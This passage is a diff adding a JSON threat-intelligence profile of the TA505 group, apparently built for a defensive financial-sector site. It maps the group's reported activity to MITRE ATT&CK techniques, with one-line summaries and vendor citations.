@@ -1,0 +1,4610 @@
+{
+  "aliases": [
+    "Hive0065",
+    "Spandex Tempest",
+    "CHIMBORAZO"
+  ],
+  "attack_id": "G0092",
+  "attack_modified": "2026-11-05T15:11:27.678Z",
+  "attack_url": "https://attack.mitre.org/groups/G0092",
+  "attack_version": "20.1",
+  "attacks": [
+    {
+      "first_seen": null,
+      "id": "G0092",
+      "kind": "group_general",
+      "last_seen": null,
+      "name": "Documented tradecraft (MITRE ATT&CK)",
+      "references": [],
+      "summary": null,
+      "url": "https://attack.mitre.org/groups/G0092"
+    },
+    {
+      "first_seen": "2023-04-21",
+      "id": "INC-0145",
+      "kind": "reported_activity",
+      "last_seen": "2023-04-21",
+      "name": "Critical Vulnerabilities in PaperCut Print Management Software | Huntress",
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Huntress: Critical Vulnerabilities in PaperCut Print Management Software | Huntress",
+          "url": "https://www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software"
+        }
+      ],
+      "summary": null,
+      "url": null
+    },
+    {
+      "first_seen": "2023-06-08",
+      "id": "INC-0331",
+      "kind": "reported_activity",
+      "last_seen": "2023-06-08",
+      "name": "CL0P likes to MOVEit MOVEit",
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Curated Intel: CL0P likes to MOVEit MOVEit",
+          "url": "https://www.curatedintel.org/2023/06/cl0p-likes-to-moveit-moveit.html"
+        }
+      ],
+      "summary": null,
+      "url": null
+    },
+    {
+      "first_seen": "2026-11-12",
+      "id": "INC-0259",
+      "kind": "reported_activity",
+      "last_seen": "2026-11-12",
+      "name": "The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Group-IB Blog: The old way: BabLock, new ransomware quietly cruising around Europe, Middle East, and Asia",
+          "url": "https://www.group-ib.com/blog/bablock-ransomware/"
+        }
+      ],
+      "summary": null,
+      "url": null
+    }
+  ],
+  "bfsi": {
+    "reason": "ATT&CK: active since 2014 (Dridex, FlawedAmmyy) and ransomware campaigns involving Clop; ATT&CK has no separate FIN11 object - Clop/FIN11 activity lives here.",
+    "tier": 2
+  },
+  "country": "Russian-speaking eCrime",
+  "counts": {
+    "attack_rows": 34,
+    "reviewed_rows": 69,
+    "rows": 103,
+    "techniques": 77
+  },
+  "description": "TA505 is a cyber criminal group that has been active since at least 2014. TA505 is known for frequently changing malware, driving global trends in criminal malware distribution, and ransomware campaigns involving Clop.",
+  "description_references": [
+    {
+      "citation": "Proofpoint Staff. (2017, September 27). Threat Actor Profile: TA505, From Dridex to GlobeImposter. Retrieved May 28, 2019.",
+      "source_name": "Proofpoint TA505 Sep 2017",
+      "url": "https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter"
+    },
+    {
+      "citation": "Proofpoint Staff. (2018, June 8). TA505 shifts with the times. Retrieved May 28, 2019.",
+      "source_name": "Proofpoint TA505 June 2018",
+      "url": "https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times"
+    },
+    {
+      "citation": "Schwarz, D. and Proofpoint Staff. (2019, January 9). ServHelper and FlawedGrace - New malware introduced by TA505. Retrieved May 28, 2019.",
+      "source_name": "Proofpoint TA505 Jan 2019",
+      "url": "https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505"
+    },
+    {
+      "citation": "Terefos, A. (2020, November 18). TA505: A Brief History of Their Time. Retrieved July 14, 2022.",
+      "source_name": "NCC Group TA505",
+      "url": "https://research.nccgroup.com/2020/11/18/ta505-a-brief-history-of-their-time/"
+    },
+    {
+      "citation": "Financial Security Institute. (2020, February 28). Profiling of TA505 Threat Group That Continues to Attack the Financial Sector. Retrieved July 14, 2022.",
+      "source_name": "Korean FSI TA505 2020",
+      "url": "https://www.fsec.or.kr/user/bbs/fsec/163/344/bbsDataView/1382.do?page=1&column=&search=&searchSDate=&searchEDate=&bbsDataCategory="
+    }
+  ],
+  "description_source": "mitre-attack",
+  "disclaimer": "Group attributions and aliases reflect public reporting by the cited vendors and agencies. Attribution is probabilistic and naming overlaps are imperfect; inclusion does not imply a definitive link to any nation-state. Reviewed auto-mappings are analyst-approved proposals from a local mapping engine. For defensive research only. Not affiliated with or endorsed by MITRE.",
+  "downloads": {
+    "csv": "csv/ta505.csv",
+    "navigator_layer": "layers/ta505.json",
+    "navigator_url": "https://mitre-attack.github.io/attack-navigator/#layerURL=https%3A%2F%2Fmadhavv13.github.io%2Fbfsi%2Flayers%2Fta505.json"
+  },
+  "id": "G0092",
+  "last_updated": "2026-11-13",
+  "motivation": "Financial gain",
+  "name": "TA505",
+  "notice": "© 2026 The MITRE Corporation. This work is reproduced and distributed with the permission of The MITRE Corporation. MITRE ATT&CK and ATT&CK are registered trademarks of The MITRE Corporation.",
+  "rows": [
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has registered domains to impersonate services such as Dropbox to distribute malware.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--0dcab59a-f989-4109-a667-d6b98898274b",
+        "relationship_modified": "2026-07-31T18:48:05.213Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Financial Security Institute. (2020, February 28). Profiling of TA505 Threat Group That Continues to Attack the Financial Sector. Retrieved July 14, 2022.",
+          "source_name": "Korean FSI TA505 2020",
+          "url": "https://www.fsec.or.kr/user/bbs/fsec/163/344/bbsDataView/1382.do?page=1&column=&search=&searchSDate=&searchEDate=&bbsDataCategory="
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1583.001",
+        "name": "Acquire Infrastructure: Domains",
+        "parent_id": "T1583",
+        "url": "https://attack.mitre.org/techniques/T1583/001"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used malware such as Azorult and Cobalt Strike in their operations.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--b359d367-d52c-4835-b242-1073d8a55bc3",
+        "relationship_modified": "2026-09-02T17:55:53.276Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Terefos, A. (2020, November 18). TA505: A Brief History of Their Time. Retrieved July 14, 2022.",
+          "source_name": "NCC Group TA505",
+          "url": "https://research.nccgroup.com/2020/11/18/ta505-a-brief-history-of-their-time/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1588.001",
+        "name": "Obtain Capabilities: Malware",
+        "parent_id": "T1588",
+        "url": "https://attack.mitre.org/techniques/T1588/001"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used a variety of tools in their operations, including AdFind, BloodHound, Mimikatz, and PowerSploit.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--3e6b6ed9-4c28-4dd0-903a-360f57864de4",
+        "relationship_modified": "2026-07-31T18:48:05.405Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Terefos, A. (2020, November 18). TA505: A Brief History of Their Time. Retrieved July 14, 2022.",
+          "source_name": "NCC Group TA505",
+          "url": "https://research.nccgroup.com/2020/11/18/ta505-a-brief-history-of-their-time/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1588.002",
+        "name": "Obtain Capabilities: Tool",
+        "parent_id": "T1588",
+        "url": "https://attack.mitre.org/techniques/T1588/002"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has staged malware on actor-controlled domains.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--75a91f69-93bc-40fd-a17c-ae675637c296",
+        "relationship_modified": "2026-07-31T18:48:05.625Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Financial Security Institute. (2020, February 28). Profiling of TA505 Threat Group That Continues to Attack the Financial Sector. Retrieved July 14, 2022.",
+          "source_name": "Korean FSI TA505 2020",
+          "url": "https://www.fsec.or.kr/user/bbs/fsec/163/344/bbsDataView/1382.do?page=1&column=&search=&searchSDate=&searchEDate=&bbsDataCategory="
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1608.001",
+        "name": "Stage Capabilities: Upload Malware",
+        "parent_id": "T1608",
+        "url": "https://attack.mitre.org/techniques/T1608/001"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used stolen domain admin accounts to compromise additional hosts.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--b7a9afc1-3bbf-4eda-9709-5392156c1e41",
+        "relationship_modified": "2026-07-31T18:48:05.766Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Frydrych, M. (2020, April 14). TA505 Continues to Infect Networks With SDBbot RAT. Retrieved May 29, 2020.",
+          "source_name": "IBM TA505 April 2020",
+          "url": "https://web.archive.org/web/20200420201624/https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        },
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        },
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1078.002",
+        "name": "Valid Accounts: Domain Accounts",
+        "parent_id": "T1078",
+        "url": "https://attack.mitre.org/techniques/T1078/002"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used spearphishing emails with malicious attachments to initially compromise victims.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--ce962c48-3390-4286-91bb-b38d7fb4f07a",
+        "relationship_modified": "2026-07-31T18:48:05.845Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Proofpoint Staff. (2017, September 27). Threat Actor Profile: TA505, From Dridex to GlobeImposter. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 Sep 2017",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter"
+        },
+        {
+          "citation": "Proofpoint Staff. (2018, June 8). TA505 shifts with the times. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 June 2018",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times"
+        },
+        {
+          "citation": "Schwarz, D. and Proofpoint Staff. (2019, January 9). ServHelper and FlawedGrace - New malware introduced by TA505. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 Jan 2019",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505"
+        },
+        {
+          "citation": "Salem, E. (2019, April 25). Threat Actor TA505 Targets Financial Enterprises Using LOLBins and a New Backdoor Malware. Retrieved May 28, 2019.",
+          "source_name": "Cybereason TA505 April 2019",
+          "url": "https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware"
+        },
+        {
+          "citation": "Proofpoint Staff. (2018, July 19). TA505 Abusing SettingContent-ms within PDF files to Distribute FlawedAmmyy RAT. Retrieved April 19, 2019.",
+          "source_name": "ProofPoint SettingContent-ms July 2018",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/ta505-abusing-settingcontent-ms-within-pdf-files-distribute-flawedammyy-rat"
+        },
+        {
+          "citation": "Proofpoint Staff. (2018, March 7). Leaked Ammyy Admin Source Code Turned into Malware. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 Mar 2018",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/leaked-ammyy-admin-source-code-turned-malware"
+        },
+        {
+          "citation": "Hiroaki, H. and Lu, L. (2019, June 12). Shifting Tactics: Breaking Down TA505 Group’s Use of HTML, RATs and Other Techniques in Latest Campaigns. Retrieved May 29, 2020.",
+          "source_name": "Trend Micro TA505 June 2019",
+          "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/"
+        },
+        {
+          "citation": "Schwarz, D. et al. (2019, October 16). TA505 Distributes New SDBbot Remote Access Trojan with Get2 Downloader. Retrieved May 29, 2020.",
+          "source_name": "Proofpoint TA505 October 2019",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader"
+        },
+        {
+          "citation": "Frydrych, M. (2020, April 14). TA505 Continues to Infect Networks With SDBbot RAT. Retrieved May 29, 2020.",
+          "source_name": "IBM TA505 April 2020",
+          "url": "https://web.archive.org/web/20200420201624/https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1566.001",
+        "name": "Phishing: Spearphishing Attachment",
+        "parent_id": "T1566",
+        "url": "https://attack.mitre.org/techniques/T1566/001"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has sent spearphishing emails containing malicious links.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--e3f7935d-0f3a-440a-be19-ef9383914441",
+        "relationship_modified": "2026-07-31T18:48:05.887Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Proofpoint Staff. (2017, September 27). Threat Actor Profile: TA505, From Dridex to GlobeImposter. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 Sep 2017",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter"
+        },
+        {
+          "citation": "Schwarz, D. and Proofpoint Staff. (2019, January 9). ServHelper and FlawedGrace - New malware introduced by TA505. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 Jan 2019",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505"
+        },
+        {
+          "citation": "Hiroaki, H. and Lu, L. (2019, June 12). Shifting Tactics: Breaking Down TA505 Group’s Use of HTML, RATs and Other Techniques in Latest Campaigns. Retrieved May 29, 2020.",
+          "source_name": "Trend Micro TA505 June 2019",
+          "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/"
+        },
+        {
+          "citation": "Schwarz, D. et al. (2019, October 16). TA505 Distributes New SDBbot Remote Access Trojan with Get2 Downloader. Retrieved May 29, 2020.",
+          "source_name": "Proofpoint TA505 October 2019",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1566.002",
+        "name": "Phishing: Spearphishing Link",
+        "parent_id": "T1566",
+        "url": "https://attack.mitre.org/techniques/T1566/002"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used PowerShell to download and execute malware and reconnaissance scripts.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--ca484dbf-aa28-4d7e-90bb-b60723ff70b1",
+        "relationship_modified": "2026-07-31T18:48:05.831Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Proofpoint Staff. (2017, September 27). Threat Actor Profile: TA505, From Dridex to GlobeImposter. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 Sep 2017",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter"
+        },
+        {
+          "citation": "Proofpoint Staff. (2018, July 19). TA505 Abusing SettingContent-ms within PDF files to Distribute FlawedAmmyy RAT. Retrieved April 19, 2019.",
+          "source_name": "ProofPoint SettingContent-ms July 2018",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/ta505-abusing-settingcontent-ms-within-pdf-files-distribute-flawedammyy-rat"
+        },
+        {
+          "citation": "Salem, E. (2019, April 25). Threat Actor TA505 Targets Financial Enterprises Using LOLBins and a New Backdoor Malware. Retrieved May 28, 2019.",
+          "source_name": "Cybereason TA505 April 2019",
+          "url": "https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware"
+        },
+        {
+          "citation": "Vilkomir-Preisman, S. (2019, April 2). New ServHelper Variant Employs Excel 4.0 Macro to Drop Signed Payload. Retrieved September 16, 2024..",
+          "source_name": "Deep Instinct TA505 Apr 2019",
+          "url": "https://www.deepinstinct.com/blog/new-servhelper-variant-employs-excel-4-0-macro-to-drop-signed-payload"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has executed commands using <code>cmd.exe</code>.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--fee6aca0-dcb7-43b4-a253-66913620631a",
+        "relationship_modified": "2026-07-31T18:48:05.982Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Hiroaki, H. and Lu, L. (2019, June 12). Shifting Tactics: Breaking Down TA505 Group’s Use of HTML, RATs and Other Techniques in Latest Campaigns. Retrieved May 29, 2020.",
+          "source_name": "Trend Micro TA505 June 2019",
+          "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.003",
+        "name": "Command and Scripting Interpreter: Windows Command Shell",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/003"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used VBS for code execution.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--5aaee352-e4b5-4d4c-b021-9f38adb346da",
+        "relationship_modified": "2026-07-31T18:48:05.532Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Proofpoint Staff. (2017, September 27). Threat Actor Profile: TA505, From Dridex to GlobeImposter. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 Sep 2017",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter"
+        },
+        {
+          "citation": "Proofpoint Staff. (2018, June 8). TA505 shifts with the times. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 June 2018",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times"
+        },
+        {
+          "citation": "Hiroaki, H. and Lu, L. (2019, June 12). Shifting Tactics: Breaking Down TA505 Group’s Use of HTML, RATs and Other Techniques in Latest Campaigns. Retrieved May 29, 2020.",
+          "source_name": "Trend Micro TA505 June 2019",
+          "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/"
+        },
+        {
+          "citation": "Frydrych, M. (2020, April 14). TA505 Continues to Infect Networks With SDBbot RAT. Retrieved May 29, 2020.",
+          "source_name": "IBM TA505 April 2020",
+          "url": "https://web.archive.org/web/20200420201624/https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.005",
+        "name": "Command and Scripting Interpreter: Visual Basic",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/005"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used JavaScript for code execution.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--6f57b4eb-ba87-4755-9b96-3715e1da1de1",
+        "relationship_modified": "2026-07-31T18:48:05.558Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Proofpoint Staff. (2017, September 27). Threat Actor Profile: TA505, From Dridex to GlobeImposter. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 Sep 2017",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter"
+        },
+        {
+          "citation": "Proofpoint Staff. (2018, June 8). TA505 shifts with the times. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 June 2018",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.007",
+        "name": "Command and Scripting Interpreter: JavaScript",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/007"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has deployed payloads that use Windows API calls on a compromised host.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--d7cfd2b5-c297-4000-b179-aca649a05f65",
+        "relationship_modified": "2026-07-31T18:48:05.862Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Financial Security Institute. (2020, February 28). Profiling of TA505 Threat Group That Continues to Attack the Financial Sector. Retrieved July 14, 2022.",
+          "source_name": "Korean FSI TA505 2020",
+          "url": "https://www.fsec.or.kr/user/bbs/fsec/163/344/bbsDataView/1382.do?page=1&column=&search=&searchSDate=&searchEDate=&bbsDataCategory="
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1106",
+        "name": "Native API",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1106"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used lures to get users to click links in emails and attachments. For example, TA505 makes their malware look like legitimate Microsoft Word documents,.pdf and/or.lnk files.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--71ee0311-3fdc-4baf-8c3e-2143416b742c",
+        "relationship_modified": "2026-07-31T18:48:05.571Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Proofpoint Staff. (2017, September 27). Threat Actor Profile: TA505, From Dridex to GlobeImposter. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 Sep 2017",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter"
+        },
+        {
+          "citation": "Proofpoint Staff. (2018, June 8). TA505 shifts with the times. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 June 2018",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times"
+        },
+        {
+          "citation": "Schwarz, D. and Proofpoint Staff. (2019, January 9). ServHelper and FlawedGrace - New malware introduced by TA505. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 Jan 2019",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505"
+        },
+        {
+          "citation": "Salem, E. (2019, April 25). Threat Actor TA505 Targets Financial Enterprises Using LOLBins and a New Backdoor Malware. Retrieved May 28, 2019.",
+          "source_name": "Cybereason TA505 April 2019",
+          "url": "https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware"
+        },
+        {
+          "citation": "Proofpoint Staff. (2018, July 19). TA505 Abusing SettingContent-ms within PDF files to Distribute FlawedAmmyy RAT. Retrieved April 19, 2019.",
+          "source_name": "ProofPoint SettingContent-ms July 2018",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/ta505-abusing-settingcontent-ms-within-pdf-files-distribute-flawedammyy-rat"
+        },
+        {
+          "citation": "Proofpoint Staff. (2018, March 7). Leaked Ammyy Admin Source Code Turned into Malware. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 Mar 2018",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/leaked-ammyy-admin-source-code-turned-malware"
+        },
+        {
+          "citation": "Hiroaki, H. and Lu, L. (2019, June 12). Shifting Tactics: Breaking Down TA505 Group’s Use of HTML, RATs and Other Techniques in Latest Campaigns. Retrieved May 29, 2020.",
+          "source_name": "Trend Micro TA505 June 2019",
+          "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/"
+        },
+        {
+          "citation": "Schwarz, D. et al. (2019, October 16). TA505 Distributes New SDBbot Remote Access Trojan with Get2 Downloader. Retrieved May 29, 2020.",
+          "source_name": "Proofpoint TA505 October 2019",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1204.001",
+        "name": "User Execution: Malicious Link",
+        "parent_id": "T1204",
+        "url": "https://attack.mitre.org/techniques/T1204/001"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives. For example, TA505 makes their malware look like legitimate Microsoft Word documents,.pdf and/or.lnk files.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--49d6508c-f350-4376-ba32-f64693d7fd10",
+        "relationship_modified": "2026-07-31T18:48:05.429Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Proofpoint Staff. (2017, September 27). Threat Actor Profile: TA505, From Dridex to GlobeImposter. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 Sep 2017",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter"
+        },
+        {
+          "citation": "Proofpoint Staff. (2018, June 8). TA505 shifts with the times. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 June 2018",
